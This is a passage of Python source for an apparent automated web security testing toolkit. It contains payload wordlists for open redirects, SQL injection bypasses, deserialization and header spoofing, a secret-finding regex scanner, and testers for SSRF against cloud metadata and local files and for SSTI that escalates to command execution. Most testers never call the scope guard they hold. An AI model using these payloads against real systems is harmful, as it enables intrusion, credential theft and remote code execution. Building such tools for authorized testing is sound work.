            "./", ".//", "..//", ".;/", "..;/",
            # IIS specific
            "::$DATA", ":$DATA",
            # Tab and space
            "%09", "%20", "+",
        ],
        "open-redirect-payloads": [
            "//evil.com", "/\\evil.com", "//evil.com/", "///evil.com",
            "////evil.com", "https://evil.com", "http://evil.com",
            "/\\/evil.com", "/.evil.com", "///evil.com/%2f..",
            "@evil.com", "?next=//evil.com", "?url=//evil.com",
            "%2f%2fevil.com", "%2F%2Fevil.com", "%5cevil.com",
            "//evil%00.com", "//evil.com%23", "//evil.com%40target.com",
            "/redirect?url=//evil.com", "//evil.com\\@target.com",
            "https:evil.com", "http:evil.com",
            "////evil.com//", "\\\\evil.com",
            "evil.com", ".evil.com",
        ],
        "header-bypass": [
            # IP spoofing headers (values tested: 127.0.0.1, localhost, internal IPs)
            "X-Forwarded-For: 127.0.0.1", "X-Real-IP: 127.0.0.1",
            "X-Originating-IP: 127.0.0.1", "X-Remote-IP: 127.0.0.1",
            "X-Remote-Addr: 127.0.0.1", "X-Client-IP: 127.0.0.1",
            "True-Client-IP: 127.0.0.1", "CF-Connecting-IP: 127.0.0.1",
            "X-Forwarded-For: localhost", "X-Forwarded-For: 10.0.0.1",
            "X-Forwarded-For: 192.168.1.1", "X-Forwarded-For: 172.16.0.1",
            # URL rewrite headers
            "X-Original-URL: /admin", "X-Rewrite-URL: /admin",
            "X-Forwarded-Host: localhost", "X-Host: localhost",
            # Method override headers
            "X-HTTP-Method-Override: PUT", "X-HTTP-Method: DELETE",
            "X-Method-Override: PATCH",
        ],
        "deserialization-payloads": [
            # PHP serialized objects
            'O:8:"stdClass":0:{}',
            'a:1:{s:4:"test";s:4:"test";}',
            'O:17:"__PHP_Incomplete_Class":0:{}',
            # Java serialized (base64)
            "rO0ABXNyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAA",
            # Node.js node-serialize
            '{"rce":"_$$ND_FUNC$$_function(){return require(\'child_process\').execSync(\'id\').toString()}()"}',
            # Python pickle (base64 encoded)
            "gASVKAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==",
            # YAML unsafe
            "!!python/object/apply:os.system ['id']",
            '!!python/object/new:subprocess.check_output [["id"]]',
        ],
        "s3-buckets": [
            # Common S3/storage bucket names
            "assets", "backups", "backup", "uploads", "upload", "data", "files",
            "images", "img", "static", "private", "public", "logs", "media",
            "documents", "docs", "attachments", "storage", "content", "temp",
            "tmp", "cache", "config", "configs", "db", "database", "dumps",
            "export", "exports", "import", "imports", "archive", "archives",
            "old", "test", "dev", "staging", "prod", "production",
            "secrets", "keys", "certs", "certificates", "internal",
        ],
        "sqli-filter-bypass": [
            # No-space SQLi (use /**/ or %09 or %0a)
            "'/**/OR/**/1=1--", "'/**/OR/**/'1'='1'--",
            "'%09OR%091=1--", "'%0aOR%0a1=1--",
            "'+OR+1=1--", "'\tOR\t1=1--",
            # Alternative logical operators
            "'||1=1--", "'||'1'='1'--",
            "1'||1#", "1'||1--+-",
            # Comment-based bypass
            "admin'--", "admin'#", "admin'/*",
            "'OR/**/1=1#", "'OR/**/1=1--+-",
            # UNION with no spaces
            "'/**/UNION/**/SELECT/**/NULL--",
            "'/**/UNION/**/SELECT/**/NULL,NULL--",
            "'/**/UNION/**/SELECT/**/NULL,NULL,NULL--",
            # Keyword alternative bypass (no AND/WHERE/LIKE)
            "'||1=1||'", "1'||1||'1",
            "'||(SELECT/**/1)='1",
            # Case bypass
            "'oR 1=1--", "'Or 1=1--", "'OR 1=1--",
            # Double URL encoding
            "%2527%2520OR%25201%253D1--",
            # Char-based bypass (avoid keyword blacklists)
            "' OR CHAR(49)=CHAR(49)--",
            "' OR 1 BETWEEN 1 AND 1--",
            "' OR 1 IN (1)--",
            "' OR 1 REGEXP 1--",
            "' OR 1 RLIKE 1--",
            # Error-based extraction (no WHERE/LIMIT/SUBSTRING/SUBSTR)
            "' OR EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
            "' OR UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--",
            # Blind boolean without AND/WHERE
            "' OR IF(1=1,1,0)--",
            "' OR IF(1=2,1,0)--",
            "' OR CASE WHEN 1=1 THEN 1 ELSE 0 END--",
        ],
    }

    def __init__(self, scope_guard: ActiveScopeGuard | None, timeout: int = 120,
                 socks_proxy: str | None = None):
        self._scope_guard = scope_guard
        self._timeout = timeout
        self._socks_proxy = socks_proxy

    async def fuzz(
        self,
        url_template: str,
        wordlist: str | list[str],
        method: str = "GET",
        headers: dict | None = None,
        body_template: str | None = None,
        match_status: list[int] | None = None,
        filter_status: list[int] | None = None,
        match_contains: str | None = None,
        filter_contains: str | None = None,
        match_length_range: tuple[int, int] | list[int] | None = None,
        max_requests: int = 500,
        rate_limit: float = 1.0,
        **kwargs: Any,
    ) -> dict[str, Any]:
        """Run wordlist-based fuzzing.

        Args:
            url_template: URL with {FUZZ} placeholder.
            wordlist: Built-in wordlist name or custom list.
            method: HTTP method (default GET).
            headers: Custom headers.
            body_template: Body with {FUZZ} placeholder.
            match_status: Status codes to include.
            filter_status: Status codes to exclude.
            match_contains: Include if response contains this.
            filter_contains: Exclude if response contains this.
            match_length_range: [min, max] length to include.
            max_requests: Max requests (default 500).
            rate_limit: Seconds between requests (default 0.05).

        Returns:
            {total_requests, matches, errors}
        """
        # Resolve wordlist
        if isinstance(wordlist, str):
            words = self.BUILTIN_WORDLISTS.get(wordlist)
            if words is None:
                return {"error": f"Unknown wordlist: {wordlist}. Available: {list(self.BUILTIN_WORDLISTS)}"}
        else:
            words = list(wordlist)

        # Limit
        words = words[:max_requests]

        # Validate base URL scope
        test_url = url_template.replace("{FUZZ}", "test")
        if self._scope_guard:
            self._scope_guard.validate_url(test_url)

        matches: list[dict[str, Any]] = []
        errors = 0
        start_time = time.monotonic()

        proxy_kwargs: dict[str, Any] = {}
        if self._socks_proxy:
            proxy_kwargs["proxy"] = self._socks_proxy
        async with httpx.AsyncClient(
            verify=False, timeout=15, follow_redirects=True, **proxy_kwargs,
        ) as client:
            for i, word in enumerate(words):
                if time.monotonic() - start_time > self._timeout:
                    break

                url = url_template.replace("{FUZZ}", word)
                body = body_template.replace("{FUZZ}", word) if body_template else None

                await asyncio.sleep(rate_limit)

                try:
                    resp = await client.request(
                        method, url, headers=headers or {}, content=body,
                    )
                except Exception:
                    errors += 1
                    continue

                # Apply filters
                status = resp.status_code
                length = len(resp.content)
                body_text = resp.text

                if filter_status and status in filter_status:
                    continue
                if match_status and status not in match_status:
                    continue
                if filter_contains and filter_contains in body_text:
                    continue
                if match_contains and match_contains not in body_text:
                    continue
                if match_length_range:
                    lr = list(match_length_range)
                    if length < lr[0] or length > lr[1]:
                        continue

                matches.append({
                    "word": word,
                    "status": status,
                    "length": length,
                    "snippet": body_text[:200],
                })

                logger.debug("fuzz_match", word=word, status=status, length=length)

        return {
            "total_requests": len(words),
            "matches": matches[:100],  # Cap at 100 matches
            "errors": errors,
            "elapsed_seconds": round(time.monotonic() - start_time, 1),
        }


# ── JS Bundle Secret Scanner ─────────────────────────────────────────

class SecretScanner:
    """Scan JS bundles and text for secrets, API keys, internal URLs.

    Zero LLM cost — pure regex matching against 20+ secret patterns.
    """

    _PATTERNS: list[tuple[str, re.Pattern]] = [
        ("aws_access_key", re.compile(r'AKIA[0-9A-Z]{16}')),
        ("aws_secret_key", re.compile(r'(?:aws_secret|secret_access)[_\s]*(?:key)?["\s:=]+([0-9a-zA-Z/+=]{40})', re.I)),
        ("github_token", re.compile(r'gh[ps]_[A-Za-z0-9_]{36,}')),
        ("stripe_secret", re.compile(r'sk_live_[0-9a-zA-Z]{24,}')),
        ("stripe_publishable", re.compile(r'pk_live_[0-9a-zA-Z]{24,}')),
        ("google_api_key", re.compile(r'AIzaSy[0-9A-Za-z\-_]{33}')),
        ("firebase_key", re.compile(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}')),
        ("jwt_token", re.compile(r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]*')),
        ("private_key", re.compile(r'-----BEGIN (?:RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----')),
        ("slack_token", re.compile(r'xox[bpors]-[0-9a-zA-Z-]{10,}')),
        ("slack_webhook", re.compile(r'https://hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[a-zA-Z0-9]+')),
        ("twilio_key", re.compile(r'SK[0-9a-fA-F]{32}')),
        ("sendgrid_key", re.compile(r'SG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}')),
        ("heroku_api", re.compile(r'[hH]eroku.*[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}')),
        ("mailgun_key", re.compile(r'key-[0-9a-zA-Z]{32}')),
        ("square_token", re.compile(r'sq0[a-z]{3}-[0-9A-Za-z\-_]{22,}')),
        ("internal_url", re.compile(r'https?://(?:internal|staging|dev|admin|api-internal|localhost|127\.0\.0\.1)[.\-:][^\s"\'<>]{3,80}', re.I)),
        ("source_map", re.compile(r'//[#@]\s*sourceMappingURL=\S+')),
        ("graphql_op", re.compile(r'(?:query|mutation|subscription)\s+([A-Z]\w{2,})\s*[\({]', re.I)),
        ("debug_route", re.compile(r'["\'](/(?:debug|_internal|actuator|__debug__|phpinfo|elmah|trace|server-status)[/"\'])', re.I)),
        ("hardcoded_password", re.compile(r'(?:password|passwd|pwd|secret)\s*[:=]\s*["\']([^"\']{4,50})["\']', re.I)),
        ("api_endpoint", re.compile(r'["\']((?:/api/|/v[0-9]+/|/graphql|/rest/)[^\s"\'<>]{2,80})["\']')),
        ("admin_path", re.compile(r'["\'](/(?:admin|manage|dashboard|panel|backoffice|cms)[^\s"\'<>]{0,60})["\']', re.I)),
    ]

    def scan(self, text: str) -> dict[str, list[dict[str, Any]]]:
        """Scan text for secrets and interesting patterns.

        Returns dict with keys: secrets, api_endpoints, internal_urls,
        graphql_ops, source_maps, debug_routes, admin_paths.
        """
        results: dict[str, list[dict[str, Any]]] = {
            "secrets": [],
            "api_endpoints": [],
            "internal_urls": [],
            "graphql_ops": [],
            "source_maps": [],
            "debug_routes": [],
            "admin_paths": [],
        }
        seen: set[str] = set()

        for pattern_name, pattern in self._PATTERNS:
            for match in pattern.finditer(text):
                value = match.group(1) if match.lastindex else match.group(0)
                # Dedup
                dedup_key = f"{pattern_name}:{value[:50]}"
                if dedup_key in seen:
                    continue
                seen.add(dedup_key)

                entry = {
                    "type": pattern_name,
                    "value": value[:200],
                    "position": match.start(),
                    "context": text[max(0, match.start() - 30):match.end() + 30][:120],
                }

                # Route to correct category
                if pattern_name in ("api_endpoint",):
                    results["api_endpoints"].append(entry)
                elif pattern_name in ("internal_url",):
                    results["internal_urls"].append(entry)
                elif pattern_name in ("graphql_op",):
                    results["graphql_ops"].append(entry)
                elif pattern_name in ("source_map",):
                    results["source_maps"].append(entry)
                elif pattern_name in ("debug_route",):
                    results["debug_routes"].append(entry)
                elif pattern_name in ("admin_path",):
                    results["admin_paths"].append(entry)
                else:
                    results["secrets"].append(entry)

        return results


# ── SSRF Tester ──────────────────────────────────────────────────────

class SSRFTester:
    """Test URL-accepting parameters for SSRF — zero LLM cost.

    Tests IP bypass techniques, cloud metadata, protocol schemes,
    and response analysis.
    """

    _PAYLOADS = [
        # Localhost variants
        ("localhost", "http://127.0.0.1"),
        ("localhost_hex", "http://0x7f000001"),
        ("localhost_decimal", "http://2130706433"),
        ("localhost_ipv6", "http://[::1]"),
        ("localhost_ipv6_short", "http://[0:0:0:0:0:0:0:1]"),
        ("localhost_octal", "http://0177.0.0.1"),
        ("localhost_zero", "http://0.0.0.0"),
        # Cloud metadata
        ("aws_metadata", "http://169.254.169.254/latest/meta-data/"),
        ("aws_metadata_dns", "http://instance-data.ec2.internal/latest/meta-data/"),
        ("gcp_metadata", "http://metadata.google.internal/computeMetadata/v1/"),
        ("azure_metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
        # Protocol schemes
        ("file_etc_passwd", "file:///etc/passwd"),
        ("file_etc_hosts", "file:///etc/hosts"),
        # Internal services on common ports
        ("internal_3000", "http://127.0.0.1:3000"),
        ("internal_5000", "http://127.0.0.1:5000"),
        ("internal_8080", "http://127.0.0.1:8080"),
        ("internal_6379", "http://127.0.0.1:6379"),  # Redis
        ("internal_9200", "http://127.0.0.1:9200"),  # Elasticsearch
    ]

    _METADATA_INDICATORS = [
        "ami-id", "instance-id", "instance-type", "local-hostname",
        "public-hostname", "public-ipv4", "security-credentials",
        "iam/info", "computeMetadata", "azureprofile",
    ]

    _INTERNAL_INDICATORS = [
        "root:x:0:0:", "/etc/passwd", "localhost", "127.0.0.1",
        "<html", "<!DOCTYPE", "Welcome", "Dashboard",
    ]

    def __init__(self, scope_guard: ActiveScopeGuard | None, timeout: int = 10,
                 socks_proxy: str | None = None):
        self._scope_guard = scope_guard
        self._timeout = timeout
        proxy_kwargs: dict[str, Any] = {}
        if socks_proxy:
            proxy_kwargs["proxy"] = socks_proxy
        self._client = httpx.AsyncClient(
            verify=False, timeout=timeout, follow_redirects=True,
            **proxy_kwargs,
        )

    async def test(
        self,
        url: str,
        param: str,
        method: str = "GET",
        cookies: dict[str, str] | None = None,
        headers: dict[str, str] | None = None,
        body: dict[str, Any] | None = None,
    ) -> dict[str, Any]:
        """Test a parameter for SSRF with multiple payload techniques."""
        results = []
        successful = []

        # First, get a baseline response for comparison
        baseline_resp = None
        try:
            if method.upper() == "GET":
                baseline_resp = await self._client.get(
                    url, params={param: "https://example.com"},
                    cookies=cookies, headers=headers,
                )
            else:
                send_body = dict(body) if body else {}
                send_body[param] = "https://example.com"
                baseline_resp = await self._client.post(
                    url, data=send_body, cookies=cookies, headers=headers,
                )
        except Exception:
            pass

        baseline_len = len(baseline_resp.text) if baseline_resp else 0

        for label, payload in self._PAYLOADS:
            try:
                if method.upper() == "GET":
                    resp = await self._client.get(
                        url, params={param: payload},
                        cookies=cookies, headers=headers,
                    )
                else:
                    send_body = dict(body) if body else {}
                    send_body[param] = payload
                    resp = await self._client.post(
                        url, data=send_body, cookies=cookies, headers=headers,
                    )

                body_text = resp.text[:5000]
                is_interesting = False
                evidence_details = []

                # Check for metadata indicators
                for indicator in self._METADATA_INDICATORS:
                    if indicator in body_text:
                        is_interesting = True
                        evidence_details.append(f"metadata indicator: {indicator}")

                # Check for internal content indicators
                for indicator in self._INTERNAL_INDICATORS:
                    if indicator in body_text:
                        is_interesting = True
                        evidence_details.append(f"internal content: {indicator}")

                # Check for significant response length difference
                if baseline_len > 0 and abs(len(resp.text) - baseline_len) > 200:
                    is_interesting = True
                    evidence_details.append(
                        f"response length diff: {len(resp.text)} vs baseline {baseline_len}"
                    )

                result_entry = {
                    "payload": label,
                    "url_sent": payload,
                    "status_code": resp.status_code,
                    "response_length": len(resp.text),
                    "interesting": is_interesting,
                }
                if evidence_details:
                    result_entry["evidence"] = evidence_details
                if is_interesting:
                    result_entry["response_preview"] = body_text[:500]
                    successful.append(result_entry)

                results.append(result_entry)

            except Exception as e:
                results.append({
                    "payload": label,
                    "url_sent": payload,
                    "error": str(e)[:100],
                })

        return {
            "vulnerable": len(successful) > 0,
            "payloads_tested": len(results),
            "successful_payloads": successful,
            "evidence": "; ".join(
                f"{s['payload']}: {', '.join(s.get('evidence', []))}"
                for s in successful
            ) if successful else "No SSRF indicators detected",
            "all_results": results[:10],  # Cap for token savings
        }

    async def close(self):
        await self._client.aclose()


# ── SSTI Tester ──────────────────────────────────────────────────────

class SSTITester:
    """Test parameters for Server-Side Template Injection — zero LLM cost.

    Tests polyglot probes, fingerprints template engine, and escalates
    to RCE payloads when confirmed.
    """

    _PROBES = [
        ("jinja2_math", "{{7*7}}", "49"),
        ("jinja2_string", "{{7*'7'}}", "7777777"),
        ("twig_math", "{{7*7}}", "49"),
        ("freemarker_math", "${7*7}", "49"),
        ("mako_math", "${7*7}", "49"),
        ("erb_math", "<%= 7*7 %>", "49"),
        ("pebble_math", "{{7*7}}", "49"),
        ("velocity_math", "#set($x=7*7)${x}", "49"),
        ("smarty_math", "{7*7}", "49"),
        ("nunjucks_math", "{{7*7}}", "49"),
        ("polyglot_1", "${{<%[%'\"}}%\\.", None),  # Detect via error
    ]

    _ENGINE_FINGERPRINTS = {
        "7777777": "Jinja2",
        "49_from_dollar": "Freemarker/Mako",
        "49_from_erb": "ERB (Ruby)",
        "49_from_curly": "Twig/Jinja2/Nunjucks/Pebble",
    }

    _RCE_PAYLOADS: dict[str, list[tuple[str, str]]] = {
        "Jinja2": [
            ("rce_config", "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"),
            ("rce_mro", "{{''.__class__.__mro__[1].__subclasses__()}}"),
        ],
        "Twig": [
            ("rce_filter", "{{['id']|filter('system')}}"),
        ],
        "Freemarker": [
            ("rce_exec", "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"),
        ],
        "ERB (Ruby)": [
            ("rce_system", "<%= system('id') %>"),
        ],
    }

    def __init__(self, scope_guard: ActiveScopeGuard | None, timeout: int = 10,
                 socks_proxy: str | None = None):
        self._scope_guard = scope_guard
        self._timeout = timeout
        proxy_kwargs: dict[str, Any] = {}
        if socks_proxy:
            proxy_kwargs["proxy"] = socks_proxy
        self._client = httpx.AsyncClient(
            verify=False, timeout=timeout, follow_redirects=True,
            **proxy_kwargs,
        )

    async def test(
        self,
        url: str,
        param: str,
        method: str = "GET",
        cookies: dict[str, str] | None = None,
        headers: dict[str, str] | None = None,
        body: dict[str, Any] | None = None,
    ) -> dict[str, Any]:
        """Test a parameter for SSTI with multiple template engine probes."""
        confirmed = False
        engine = "unknown"
        confirmed_payload = ""
        evidence_text = ""
        probes_tested = 0
        rce_results = []

        for label, probe, expected in self._PROBES:
            probes_tested += 1
            try:
                if method.upper() == "GET":
                    resp = await self._client.get(
                        url, params={param: probe},
                        cookies=cookies, headers=headers,
                    )
                else:
                    send_body = dict(body) if body else {}
                    send_body[param] = probe
                    resp = await self._client.post(
                        url, data=send_body, cookies=cookies, headers=headers,
                    )

                body_text = resp.text

                if expected and expected in body_text:
                    confirmed = True
                    confirmed_payload = probe

                    # Fingerprint the engine
                    if expected == "7777777":
                        engine = "Jinja2"
                    elif expected == "49":
                        if "${" in probe:
                            engine = "Freemarker/Mako"
                        elif "<%=" in probe:
                            engine = "ERB (Ruby)"
                        elif "{{" in probe:
                            engine = "Jinja2/Twig/Nunjucks"

                    evidence_text = (
                        f"SSTI confirmed: probe '{probe}' returned '{expected}' "
                        f"in response. Engine: {engine}. "
                        f"HTTP {resp.status_code}, response snippet: {body_text[:300]}"
                    )
                    break

                # Check for template error (polyglot probe)
                if expected is None:
                    error_indicators = [
                        "TemplateSyntaxError", "Template error", "UndefinedError",
                        "ParseException", "freemarker", "twig", "jinja2",
                        "ERB", "SyntaxError", "template",
                    ]
                    if any(ind.lower() in body_text.lower() for ind in error_indicators):
                        evidence_text = (
                            f"Template error triggered by polyglot probe. "
                            f"HTTP {resp.status_code}, error snippet: {body_text[:500]}"
                        )

            except Exception:
                continue

        # If confirmed, try RCE escalation
        if confirmed and engine != "unknown":
            rce_payloads = self._RCE_PAYLOADS.get(engine, [])
            for rce_label, rce_payload in rce_payloads:
                try:
                    if method.upper() == "GET":
                        resp = await self._client.get(
                            url, params={param: rce_payload},
                            cookies=cookies, headers=headers,
                        )
                    else:
                        send_body = dict(body) if body else {}
                        send_body[param] = rce_payload
                        resp = await self._client.post(
                            url, data=send_body, cookies=cookies, headers=headers,
                        )

                    if "uid=" in resp.text or "root:" in resp.text:
                        rce_results.append({
                            "label": rce_label,
                            "payload": rce_payload,
                            "output": resp.text[:500],
                            "rce_confirmed": True,
                        })
                    else:
                        rce_results.append({
                            "label": rce_label,
                            "payload": rce_payload,
                            "output": resp.text[:200],
                            "rce_confirmed": False,
                        })
                except Exception as e:
                    rce_results.append({"label": rce_label, "error": str(e)[:100]})

        return {
            "vulnerable": confirmed,
            "engine": engine,
            "probes_tested": probes_tested,
            "confirmed_payload": confirmed_payload,
            "evidence": evidence_text or "No SSTI indicators detected",
            "rce_escalation": rce_results if rce_results else None,
            "template_error_detected": bool(evidence_text and not confirmed),
        }

    async def close(self):
        await self._client.aclose()


# ── Race Condition Tester ────────────────────────────────────────────

class RaceConditionTester:
    """Fire concurrent identical requests to detect race conditions.

    Zero LLM cost — pure async HTTP.
    """

    def __init__(self, scope_guard: ActiveScopeGuard | None, timeout: int = 15,
                 socks_proxy: str | None = None):
        self._scope_guard = scope_guard
        self._timeout = timeout
        self._socks_proxy = socks_proxy

    async def test(
        self,
        url: str,
        method: str = "POST",
        body: dict[str, Any] | str | None = None,
        headers: dict[str, str] | None = None,
        cookies: dict[str, str] | None = None,
        concurrent_requests: int = 20,
    ) -> dict[str, Any]:
        """Fire N identical requests simultaneously and analyze results."""
        proxy_kwargs: dict[str, Any] = {}
        if self._socks_proxy:
            proxy_kwargs["proxy"] = self._socks_proxy

        async def _send_one(idx: int) -> dict[str, Any]:
            async with httpx.AsyncClient(
                verify=False, timeout=self._timeout, **proxy_kwargs
            ) as client:
                start = time.time()
                try:
                    kwargs: dict[str, Any] = {"headers": headers, "cookies": cookies}
                    if isinstance(body, dict):
                        kwargs["data"] = body
                    elif isinstance(body, str):
                        kwargs["content"] = body

                    resp = await getattr(client, method.lower())(url, **kwargs)
                    elapsed = time.time() - start
                    return {
                        "index": idx,
                        "status_code": resp.status_code,
                        "response_length": len(resp.text),
                        "elapsed_ms": int(elapsed * 1000),
                        "preview": resp.text[:200],
                    }
                except Exception as e:
                    elapsed = time.time() - start
                    return {
                        "index": idx,
                        "error": str(e)[:100],
                        "elapsed_ms": int(elapsed * 1000),
                    }

        # Fire all requests simultaneously
        tasks = [_send_one(i) for i in range(concurrent_requests)]
        results = await asyncio.gather(*tasks)

        # Analyze results
        success_results = [r for r in results if "status_code" in r]
        status_codes = [r["status_code"] for r in success_results]
        unique_statuses = set(status_codes)
        response_lengths = [r["response_length"] for r in success_results]
        unique_lengths = set(response_lengths)
        successes_2xx = [r for r in success_results if 200 <= r["status_code"] < 300]
        response_times = [r["elapsed_ms"] for r in results if "elapsed_ms" in r]

        # Detect race condition indicators
        race_detected = False
        indicators = []

        # Multiple 2xx responses for a single-use operation
        if len(successes_2xx) > 1:
            indicators.append(f"{len(successes_2xx)} successful (2xx) responses out of {concurrent_requests}")

        # Highly varied response bodies suggest non-atomic processing
        if len(unique_lengths) > 3 and len(success_results) > 5:
            indicators.append(f"{len(unique_lengths)} different response lengths detected")

        # All succeeded with same status — suspicious for limited-use operations
        if len(unique_statuses) == 1 and len(successes_2xx) == concurrent_requests:
            indicators.append(f"All {concurrent_requests} requests returned same 2xx status")
            race_detected = True

        return {
            "total_sent": concurrent_requests,
            "total_succeeded": len(successes_2xx),
            "unique_status_codes": sorted(unique_statuses),
            "unique_response_lengths": len(unique_lengths),
            "response_times_ms": {
                "min": min(response_times) if response_times else 0,
                "max": max(response_times) if response_times else 0,
                "avg": int(sum(response_times) / len(response_times)) if response_times else 0,
            },
            "race_detected": race_detected,
            "indicators": indicators,
            "sample_responses": results[:5],
        }


# ── GraphQL Analyzer ─────────────────────────────────────────────────

class GraphQLAnalyzer:
    """Analyze GraphQL endpoints for misconfigurations — zero LLM cost.

    Tests introspection, enumerates mutations/queries, checks auth.
    """

    _INTROSPECTION_QUERY = """
    query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        types {
          name
          kind
          fields {
            name
            args { name type { name kind } }
            type { name kind ofType { name kind } }
          }
        }
      }
    }
    """

    def __init__(self, scope_guard: ActiveScopeGuard | None, timeout: int = 15,
                 socks_proxy: str | None = None):
        self._scope_guard = scope_guard
        self._timeout = timeout
        proxy_kwargs: dict[str, Any] = {}
        if socks_proxy:
            proxy_kwargs["proxy"] = socks_proxy
        self._client = httpx.AsyncClient(
            verify=False, timeout=timeout, **proxy_kwargs,
        )

    async def analyze(
        self,
        url: str,
        cookies: dict[str, str] | None = None,
        headers: dict[str, str] | None = None,
    ) -> dict[str, Any]:
        """Analyze a GraphQL endpoint."""
        gql_headers = {"Content-Type": "application/json"}
        if headers:
            gql_headers.update(headers)

        # Step 1: Test introspection
        schema_available = False
        mutations = []
        queries = []
        all_types = []

        try:
            resp = await self._client.post(
                url,
                json={"query": self._INTROSPECTION_QUERY},
                headers=gql_headers,
                cookies=cookies,
            )
            data = resp.json()
            if "data" in data and data["data"].get("__schema"):
                schema_available = True
                schema = data["data"]["__schema"]

                # Extract types
                for t in schema.get("types", []):
                    name = t.get("name", "")
                    if name.startswith("__"):
                        continue  # Skip introspection types
                    kind = t.get("kind", "")
                    fields = t.get("fields") or []

                    type_info = {
                        "name": name,
                        "kind": kind,
                        "fields": [
                            {
                                "name": f["name"],
                                "args": [a["name"] for a in (f.get("args") or [])],
                            }
                            for f in fields[:20]
                        ],
                    }
                    all_types.append(type_info)

                    # Categorize as query or mutation
                    query_type_name = (schema.get("queryType") or {}).get("name", "Query")
                    mutation_type_name = (schema.get("mutationType") or {}).get("name", "Mutation")

                    if name == query_type_name:
                        for f in fields:
                            queries.append({
                                "name": f["name"],
                                "args": [a["name"] for a in (f.get("args") or [])],
                            })
                    elif name == mutation_type_name:
                        for f in fields:
                            mutations.append({
                                "name": f["name"],
                                "args": [a["name"] for a in (f.get("args") or [])],
                            })
        except Exception as e:
            pass

        # Step 2: Test mutations as anonymous (no auth cookies)
        unprotected_mutations = []
        if mutations:
            for mut in mutations[:10]:  # Test up to 10
                try:
                    # Send a minimal mutation without auth
                    test_query = f"mutation {{ {mut['name']} }}"
                    resp = await self._client.post(
                        url,
                        json={"query": test_query},
                        headers={"Content-Type": "application/json"},
                        # No cookies — anonymous
                    )
                    resp_data = resp.json()
                    errors = resp_data.get("errors", [])

                    # Check if auth error occurred
                    auth_error = any(
                        any(kw in str(e).lower() for kw in ("unauthorized", "forbidden", "authentication", "not authenticated", "login required", "access denied"))
                        for e in errors
                    )

                    if not auth_error and not errors:
                        unprotected_mutations.append({
                            "name": mut["name"],
                            "status": "no_auth_required",
                            "response": str(resp_data)[:200],
                        })
                    elif not auth_error and errors:
                        # Errors but not auth-related — might be arg validation
                        error_msgs = [str(e.get("message", ""))[:100] for e in errors[:2]]
                        if not any("auth" in m.lower() or "permission" in m.lower() for m in error_msgs):
                            unprotected_mutations.append({
                                "name": mut["name"],
                                "status": "possibly_unprotected",
                                "errors": error_msgs,
                            })
                except Exception:
                    continue

        # Step 3: Test depth limit
        depth_limit = None
        try:
            # Build a deeply nested query
            nested = "{ __typename " * 20 + "}" * 20
            resp = await self._client.post(
                url,
                json={"query": "query " + nested},
                headers=gql_headers,
                cookies=cookies,
            )
            resp_data = resp.json()
            if resp_data.get("errors"):
                error_msg = str(resp_data["errors"][0].get("message", ""))
                if "depth" in error_msg.lower() or "complex" in error_msg.lower():
                    depth_limit = "enforced"
                else:
                    depth_limit = "possibly_enforced"
            else:
                depth_limit = "not_enforced"
        except Exception:
            pass

        return {
            "schema_available": schema_available,
            "mutations": mutations[:30],
            "queries": queries[:30],
            "types_count": len(all_types),
            "unprotected_mutations": unprotected_mutations,
            "depth_limit": depth_limit,
            "introspection_enabled": schema_available,
        }

    async def close(self):
        await self._client.aclose()


# ── Authorization Matrix Tester ──────────────────────────────────────

class AuthorizationMatrixTester:
    """Test authorization across roles for every endpoint.

    Zero LLM cost — pure HTTP requests with different auth contexts.
    """

    def __init__(self, scope_guard: ActiveScopeGuard | None, timeout: int = 10,
                 socks_proxy: str | None = None):
        self._scope_guard = scope_guard
        self._timeout = timeout
        proxy_kwargs: dict[str, Any] = {}
        if socks_proxy:
            proxy_kwargs["proxy"] = socks_proxy
        self._client = httpx.AsyncClient(
            verify=False, timeout=timeout, follow_redirects=False,
            **proxy_kwargs,
        )

    async def test(
        self,
        endpoints: list[dict[str, Any]],
        auth_contexts: dict[str, dict[str, Any]],
    ) -> dict[str, Any]:
        """Test every endpoint as every role.

        Args:
            endpoints: List of {"url": str, "method": str}
            auth_contexts: Dict of role_name -> {"cookies": {...}, "headers": {...}}
                          Always includes "anonymous" with no auth.
        """
        # Ensure anonymous context exists
        if "anonymous" not in auth_contexts:
            auth_contexts["anonymous"] = {}

        matrix: dict[str, dict[str, dict[str, Any]]] = {}
        access_gaps = []

        for ep in endpoints[:30]:  # Cap at 30 endpoints
            url = ep.get("url", "")
            method = ep.get("method", "GET").upper()
            ep_key = f"{method} {url}"
            matrix[ep_key] = {}

            for role, ctx in auth_contexts.items():
                try:
                    kwargs: dict[str, Any] = {
                        "cookies": ctx.get("cookies"),
                        "headers": ctx.get("headers"),
                    }
                    resp = await getattr(self._client, method.lower())(url, **kwargs)
                    matrix[ep_key][role] = {
                        "status": resp.status_code,
                        "length": len(resp.text),
                    }
                except Exception as e:
                    matrix[ep_key][role] = {"error": str(e)[:80]}

            # Detect access gaps
            role_statuses = {
                role: info.get("status", 0)
                for role, info in matrix[ep_key].items()
                if isinstance(info, dict) and "status" in info
            }

            # If ALL roles get same status, it's public — skip
            if len(set(role_statuses.values())) <= 1:
                continue

            # Check if anonymous can access something that should be protected
            anon_status = role_statuses.get("anonymous", 0)
            if 200 <= anon_status < 400:
                # Anonymous can access — is this expected?
                for role, status in role_statuses.items():
                    if role != "anonymous" and 200 <= status < 400:
                        continue  # Both can access — might be public
                # If higher-privilege roles get same access, flag it
                auth_roles = [r for r in role_statuses if r != "anonymous"]
